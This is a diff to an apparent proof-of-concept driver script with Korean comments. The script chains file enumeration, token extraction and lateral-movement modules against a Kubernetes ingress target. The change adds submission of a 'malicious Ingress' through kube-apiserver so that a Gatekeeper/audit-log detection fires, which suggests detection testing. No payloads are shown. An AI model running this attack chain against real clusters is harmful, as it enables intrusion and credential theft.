@@ -23,7 +23,7 @@ import sys
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-from poc.modules.file_enum import enumerate_paths, summarize_enum
+from poc.modules.file_enum import enumerate_paths, summarize_enum, trigger_via_apiserver
 from poc.modules.token_extract import extract_token
 from poc.modules.lateral_move import run_lateral_movement
 from poc.modules.reporter import build_report, save_json, save_markdown, print_summary
@@ -126,10 +126,18 @@ def preflight(target: str) -> bool:
 def run_t1(target: str) -> dict | None:
     banner("T1 — 파일 열거 (시나리오 A)")
     try:
+        # 1) 직접 webhook POST — nginx -t 에러로 파일 접근 여부 확인
         results = enumerate_paths(target, verbose=True)
         summary = summarize_enum(results)
         print()
         ok(f"열거 완료: {summary['accessible_count']}/{summary['total_probed']} 경로 접근 가능")
+
+        # 2) kube-apiserver 경유 Ingress 제출 — Gatekeeper/Audit Log D2 탐지 트리거
+        #    (직접 POST는 kube-apiserver를 우회하므로 D2는 이 경로로만 탐지됨)
+        info("D2 탐지 트리거: kube-apiserver 경유 악성 Ingress 제출...")
+        d2_result = trigger_via_apiserver(verbose=True)
+        summary["d2_apiserver_trigger"] = d2_result
+
         return summary
     except Exception as e:
         warn(f"T1 파일 열거 실패: {e}")
